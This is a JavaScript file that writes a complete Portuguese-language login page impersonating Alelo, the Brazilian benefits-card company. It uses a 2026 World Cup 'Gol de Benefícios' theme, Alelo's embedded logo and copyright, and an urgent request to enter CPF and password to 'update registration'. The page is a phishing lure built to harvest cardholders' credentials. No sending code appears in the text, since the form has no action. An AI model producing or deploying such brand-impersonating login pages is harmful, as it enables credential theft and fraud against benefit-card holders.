document.open();

document.write(`
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Alelo — Gol de Benefícios</title>
  <style>
    :root {
      --ground:       #002D14;
      --lime:         #C8D400;
      --purple:       #9B3DB8;
      --text:         #FFFFFF;
      --muted:        rgba(255,255,255,0.58);
      --card-bg:      rgba(0, 22, 10, 0.80);
      --card-border:  rgba(200, 212, 0, 0.20);
      --input-bg:     rgba(255,255,255,0.07);
      --input-border: rgba(255,255,255,0.16);
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
      background: var(--ground);
      color: var(--text);
      min-height: 100vh;
      overflow-x: hidden;
    }

    #field-canvas {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      pointer-events: none;
    }

    .page {
      position: relative;
      z-index: 1;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    header {
      padding: 26px 56px;
      display: flex;
      align-items: center;
    }

    main {
      flex: 1;
      display: grid;
      grid-template-columns: 1fr 1fr;
      align-items: center;
      gap: 52px;
      padding: 16px 72px 60px;
      max-width: 1200px;
      margin: 0 auto;
      width: 100%;
    }

    /* ── Campaign panel ── */
    .campaign { padding-right: 24px; }

    .eyebrow {
      display: inline-flex;
      align-items: center;
      gap: 7px;
      border: 1px solid rgba(200, 212, 0, 0.35);
      background: rgba(200, 212, 0, 0.09);
      border-radius: 100px;
      padding: 5px 14px;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      color: var(--lime);
      margin-bottom: 26px;
    }

    .headline {
      font-size: clamp(50px, 6.4vw, 86px);
      font-weight: 900;
      line-height: 0.88;
      letter-spacing: -0.03em;
      text-transform: uppercase;
      margin-bottom: 14px;
    }
    .headline .gol {
      display: block;
      font-style: italic;
      color: var(--lime);
      letter-spacing: -0.04em;
    }
    .headline .rest {
      display: block;
      color: var(--text);
      font-style: normal;
    }
    .headline .excl { color: var(--purple); }

    .sub-headline {
      font-size: 15px;
      font-weight: 600;
      color: rgba(255,255,255,0.72);
      margin-bottom: 28px;
      letter-spacing: 0.01em;
      line-height: 1.4;
    }

    .body-text {
      font-size: 15.5px;
      line-height: 1.68;
      color: var(--muted);
      max-width: 420px;
      margin-bottom: 32px;
    }
    .body-text strong { color: var(--lime); font-weight: 600; }

    .perks-title {
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      color: rgba(255,255,255,0.38);
      margin-bottom: 14px;
    }

    .perks {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 30px;
    }
    .perks li {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 14.5px;
      color: var(--muted);
      line-height: 1.4;
    }
    .perk-ball {
      font-size: 15px;
      flex-shrink: 0;
      line-height: 1;
    }

    .closing-line {
      font-size: 15px;
      font-weight: 600;
      color: rgba(255,255,255,0.68);
      font-style: italic;
    }

    /* ── Login card ── */
    .login-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 22px;
      padding: 44px 44px 40px;
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      box-shadow: 0 24px 80px rgba(0,0,0,0.48);
    }

    /* ── Progress stepper ── */
    .stepper {
      display: flex;
      align-items: flex-start;
      margin-bottom: 32px;
    }
    .step {
      display: flex;
      flex-direction: column;
      align-items: center;
      flex-shrink: 0;
    }
    .step-line {
      flex: 1;
      border-top: 2px dashed rgba(255,255,255,0.13);
      margin-top: 14px;
    }
    .step-dot {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: 800;
      line-height: 1;
    }
    .step.active .step-dot {
      background: var(--lime);
      color: #192800;
      box-shadow: 0 0 0 4px rgba(200,212,0,0.18);
    }
    .step.pending .step-dot {
      background: rgba(255,255,255,0.06);
      border: 1.5px solid rgba(255,255,255,0.14);
      color: rgba(255,255,255,0.28);
    }
    .step.goal .step-dot {
      background: rgba(255,255,255,0.04);
      border: 1.5px solid rgba(255,255,255,0.10);
      font-size: 15px;
    }
    .step-label {
      font-size: 9.5px;
      text-align: center;
      margin-top: 6px;
      white-space: nowrap;
      letter-spacing: 0.01em;
    }
    .step.active .step-label  { color: var(--lime); font-weight: 700; }
    .step.pending .step-label { color: rgba(255,255,255,0.24); }
    .step.goal .step-label    { color: rgba(255,255,255,0.22); }

    /* ── Form ── */
    .card-head { margin-bottom: 28px; }
    .card-head h2 { font-size: 20px; font-weight: 700; margin-bottom: 4px; }
    .card-head p  { font-size: 13.5px; color: var(--muted); line-height: 1.5; }

    .form-group {
      display: flex;
      flex-direction: column;
      gap: 6px;
      margin-bottom: 16px;
    }
    label {
      font-size: 11.5px;
      font-weight: 700;
      color: var(--muted);
      letter-spacing: 0.06em;
      text-transform: uppercase;
    }
    input[type="text"],
    input[type="password"] {
      background: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 10px;
      padding: 13px 15px;
      font-size: 15px;
      color: var(--text);
      outline: none;
      transition: border-color 0.18s, box-shadow 0.18s;
      font-family: inherit;
      width: 100%;
    }
    input::placeholder { color: rgba(255,255,255,0.24); }
    input:focus {
      border-color: var(--lime);
      box-shadow: 0 0 0 3px rgba(200, 212, 0, 0.13);
    }

    .row-forgot {
      display: flex;
      justify-content: flex-end;
      margin-top: -6px;
      margin-bottom: 24px;
    }
    .row-forgot a {
      font-size: 12.5px;
      color: var(--lime);
      text-decoration: none;
      opacity: 0.75;
      transition: opacity 0.15s;
    }
    .row-forgot a:hover { opacity: 1; }
    .row-forgot a:focus-visible { outline: 2px solid var(--lime); border-radius: 3px; }

    .btn-primary {
      width: 100%;
      padding: 15px;
      background: var(--lime);
      color: #192800;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 800;
      letter-spacing: 0.03em;
      cursor: pointer;
      font-family: inherit;
      transition: transform 0.15s, box-shadow 0.15s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 28px rgba(200, 212, 0, 0.30);
    }
    .btn-primary:active { transform: none; box-shadow: none; }
    .btn-primary:focus-visible { outline: 2px solid var(--lime); outline-offset: 3px; }

    .card-foot {
      text-align: center;
      font-size: 12.5px;
      color: var(--muted);
      margin-top: 18px;
    }
    .card-foot a { color: var(--lime); text-decoration: none; }
    .card-foot a:hover { text-decoration: underline; }

    footer {
      position: relative;
      z-index: 1;
      text-align: center;
      padding: 18px;
      font-size: 11px;
      color: rgba(255,255,255,0.20);
    }

    /* ── Responsive ── */
    @media (max-width: 860px) {
      main {
        grid-template-columns: 1fr;
        padding: 20px 28px 52px;
        gap: 36px;
      }
      .campaign { padding-right: 0; }
      header { padding: 22px 28px; }
      .login-card { padding: 36px 28px 32px; }
    }

    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after { animation: none !important; transition: none !important; }
    }
  </style>
</head>
<body>

<canvas id="field-canvas"></canvas>

<div class="page">
  <header>
    <img
      src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSItNi45NzQyNzA3Njc0MTQxNDcgMCAyMjguMDU1ODMwOTU3NDQ2OSAxNDguODc4NTUwMTE2NzU0NCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMjUwMCIgaGVpZ2h0PSIxNTg0Ij48cGF0aCBkPSJNMTQyLjgyIDBBNjkuNSA2OS41IDAgMCAwIDEwNCAxMS44M2MtLjc5LjU0LTYuMjUgNC40NC02LjQ5IDQuNjMtOS4wNyA2LjgyLTE1LjE2IDgtMjMuNSA1LjkxLS41MS0uMTMtMi45LS45NS0zLjY1LTEuMjRhNTIgNTIgMCAxIDAtMS44OSA5OGMxMi40NC0zLjcyIDE5LjE5LTIuNyAyNyAyLjgxIDEuNTYgMS4xIDUuMzIgMy41MSA2LjEgNC4wOEE2OS43NyA2OS43NyAwIDEgMCAxNDIuODIgMHoiIGZpbGw9IiMwMDc4NTgiLz48ZyBmaWxsPSIjZmZmIj48cGF0aCBkPSJNMTE3LjY1IDgwLjU2YTEyLjMzIDEyLjMzIDAgMCAxLTE1LjI2IDEuNjJsLTQuNjMgNy4zNWEyMS4wNyAyMS4wNyAwIDAgMCAyNi0yLjc2ek0xMDkuMzEgNTAuNjJhMjEuMDggMjEuMDggMCAwIDAtMTggMzIuNThsMzguMTgtMTYuMzJhMjEuMDkgMjEuMDkgMCAwIDAtMjAuMTgtMTYuMjZ6TTk2LjY2IDczYTEyLjM5IDEyLjM5IDAgMCAxIDIxLjgtOS4zMnpNMTQxLjQ4IDQxLjEzdjQwLjY5bDcuMDYgMi45My0zLjMzIDgtNy0yLjlhNy43MSA3LjcxIDAgMCAxLTMuNDQtMi45IDkgOSAwIDAgMS0xLjM1LTVWNDEuMTN6TTgwIDQxLjEzdjQwLjY5bDcgMi45My0zLjMzIDgtNy0yLjlBNy43MSA3LjcxIDAgMCAxIDczLjM0IDg3YTkgOSAwIDAgMS0xLjM2LTVWNDEuMTN6Ii8+PC9nPjxwYXRoIGQ9Ik0xNzYuMjIgNjAuNTFBMTIuNCAxMi40IDAgMCAxIDE4MiA3Ny4wN2w3LjgxIDMuNzVhMjEuMDggMjEuMDggMCAwIDAtMzMuMTktMjQuNzFsNS44NCA2LjQxYTEyLjM5IDEyLjM5IDAgMCAxIDEzLjc2LTIuMDF6IiBmaWxsPSIjYzdkNTQwIi8+PHBhdGggZD0iTTE2NS40NyA4Mi44OGExMi40MiAxMi40MiAwIDAgMS01LjgxLTE2LjU2bC03LjgxLTMuNzZBMjEuMDggMjEuMDggMCAwIDAgMTg1IDg3LjI3bC01Ljg0LTYuNGExMi40MSAxMi40MSAwIDAgMS0xMy42OSAyLjAxek02NCA4My40N1Y3MS42OWEyMSAyMSAwIDEgMC0yMSAyMSAyMSAyMSAwIDAgMCA5LjM4LTIuMjFMNDkgODIuNThhMTIuNDIgMTIuNDIgMCAwIDEtMTguNDMtMTAuODlBMTIuMzIgMTIuMzIgMCAwIDEgMzIgNjUuODZhMTIuNDYgMTIuNDYgMCAwIDEgOC4xNy02LjI3IDEyLjI2IDEyLjI2IDAgMCAxIDIuOC0uMzMgMTIuNDUgMTIuNDUgMCAwIDEgMTIuNDYgMTIuNDN2MTEuNjhhOSA5IDAgMCAwIDEuMzUgNSA3Ljg0IDcuODQgMCAwIDAgMy40NCAyLjlsMy45NCAxLjU2IDMuMzQtOHoiIGZpbGw9IiNmZmYiLz48L3N2Zz4="
      width="86"
      height="54"
      alt="Alelo"
      style="display: block;"
    />
  </header>

  <main>
    <!-- ── Campaign left panel ── -->
    <div class="campaign">
      <span class="eyebrow">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <circle cx="12" cy="12" r="10"/>
          <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
          <path d="M2 12h20"/>
        </svg>
        Copa do Mundo 2026
      </span>

      <h1 class="headline">
        <span class="gol">Gol de</span>
        <span class="rest">Benefícios<span class="excl">!</span></span>
      </h1>

      <p class="sub-headline">Marque esse gol mantendo seu cadastro atualizado.</p>

      <p class="body-text">
        Assim como um time precisa de informações corretas para entrar em campo,
        seus benefícios dependem de um cadastro atualizado.
        Reserve <strong>menos de 2 minutos</strong> para revisar suas informações
        e garantir uma experiência mais segura e eficiente.
      </p>

      <p class="perks-title">Por que atualizar?</p>
      <ul class="perks">
        <li><span class="perk-ball" aria-hidden="true">⚽</span> Mais segurança para sua conta</li>
        <li><span class="perk-ball" aria-hidden="true">⚽</span> Comunicação importante sem falhas</li>
        <li><span class="perk-ball" aria-hidden="true">⚽</span> Dados sempre corretos e atualizados</li>
        <li><span class="perk-ball" aria-hidden="true">⚽</span> Melhor atendimento quando você precisar</li>
      </ul>

      <p class="closing-line">Pronto para marcar esse gol?</p>
    </div>

    <!-- ── Login card ── -->
    <div class="login-card">

      <!-- Progress stepper -->
      <div class="stepper" role="list" aria-label="Etapas do processo">
        <div class="step active" role="listitem">
          <div class="step-dot" aria-current="step">1</div>
          <div class="step-label">Login</div>
        </div>
        <div class="step-line"></div>
        <div class="step pending" role="listitem">
          <div class="step-dot">2</div>
          <div class="step-label">Conferir dados</div>
        </div>
        <div class="step-line"></div>
        <div class="step pending" role="listitem">
          <div class="step-dot">3</div>
          <div class="step-label">Atualizar</div>
        </div>
        <div class="step-line"></div>
        <div class="step goal" role="listitem">
          <div class="step-dot" aria-label="Gol">🥅</div>
          <div class="step-label">Gol!</div>
        </div>
      </div>

      <div class="card-head">
        <h2>Acesse sua conta</h2>
        <p>Faça login e confirme seus dados agora mesmo.</p>
      </div>

      <form novalidate>
        <div class="form-group">
          <label for="cpf">CPF</label>
          <input
            type="text"
            id="cpf"
            name="cpf"
            placeholder="000.000.000-00"
            autocomplete="username"
            inputmode="numeric"
            maxlength="14"
          />
        </div>

        <div class="form-group">
          <label for="senha">Senha</label>
          <input
            type="password"
            id="senha"
            name="senha"
            placeholder="Sua senha"
            autocomplete="current-password"
          />
        </div>

        <div class="row-forgot">
          <a href="#">Esqueci minha senha</a>
        </div>

        <button type="submit" class="btn-primary">
          <span aria-hidden="true">⚽</span> Marcar meu gol
        </button>
      </form>

      <p class="card-foot">
        Problemas para acessar?&nbsp;<a href="#">Fale com o suporte</a>
      </p>
    </div>
  </main>

  <footer>© 2026 Alelo. Todos os direitos reservados.</footer>
</div>

<script>
  const canvas = document.getElementById('field-canvas');
  const ctx = canvas.getContext('2d');

  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener('resize', resize);

  const balls = Array.from({ length: 9 }, () => ({
    x: Math.random() * window.innerWidth,
    y: Math.random() * window.innerHeight,
    r: 18 + Math.random() * 32,
    dx: (Math.random() - 0.5) * 0.25,
    dy: (Math.random() - 0.5) * 0.25,
    rot: Math.random() * Math.PI * 2,
    drot: (Math.random() - 0.5) * 0.006,
    alpha: 0.04 + Math.random() * 0.07,
  }));

  function drawBall(b) {
    ctx.save();
    ctx.translate(b.x, b.y);
    ctx.rotate(b.rot);
    ctx.globalAlpha = b.alpha;
    ctx.strokeStyle = '#C8D400';

    ctx.beginPath();
    ctx.arc(0, 0, b.r, 0, Math.PI * 2);
    ctx.lineWidth = 1.4;
    ctx.stroke();

    const a5 = [0, 1, 2, 3, 4].map(i => (i * Math.PI * 2) / 5 - Math.PI / 2);
    const ri = b.r * 0.32, ro = b.r * 0.70;

    ctx.beginPath();
    a5.forEach((a, i) => {
      const px = Math.cos(a) * ri, py = Math.sin(a) * ri;
      i === 0 ? ctx.moveTo(px, py) : ctx.lineTo(px, py);
    });
    ctx.closePath();
    ctx.lineWidth = 1;
    ctx.stroke();

    a5.forEach(a => {
      ctx.beginPath();
      ctx.moveTo(Math.cos(a) * ri, Math.sin(a) * ri);
      ctx.lineTo(Math.cos(a) * ro, Math.sin(a) * ro);
      ctx.stroke();
    });

    ctx.restore();
  }

  function draw() {
    const w = canvas.width, h = canvas.height;
    ctx.clearRect(0, 0, w, h);

    const stripes = 14, sh = h / stripes;
    for (let i = 0; i < stripes; i++) {
      ctx.fillStyle = i % 2 === 0 ? '#002D14' : '#002610';
      ctx.fillRect(0, i * sh, w, sh);
    }

    ctx.save();
    ctx.globalAlpha = 0.04;
    ctx.beginPath();
    ctx.arc(w * 0.25, h * 0.52, h * 0.38, 0, Math.PI * 2);
    ctx.strokeStyle = '#C8D400';
    ctx.lineWidth = 2;
    ctx.stroke();
    ctx.restore();

    ctx.save();
    ctx.globalAlpha = 0.03;
    ctx.beginPath();
    ctx.moveTo(w * 0.25, 0);
    ctx.lineTo(w * 0.25, h);
    ctx.strokeStyle = '#C8D400';
    ctx.lineWidth = 1.5;
    ctx.stroke();
    ctx.restore();

    balls.forEach(b => drawBall(b));
  }

  function tick() {
    const w = canvas.width, h = canvas.height;
    balls.forEach(b => {
      b.x += b.dx; b.y += b.dy; b.rot += b.drot;
      if (b.x < -60) b.x = w + 60;
      if (b.x > w + 60) b.x = -60;
      if (b.y < -60) b.y = h + 60;
      if (b.y > h + 60) b.y = -60;
    });
    draw();
    requestAnimationFrame(tick);
  }

  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
    draw();
  } else {
    tick();
  }
</script>

</body>
</html>

`);

document.close();
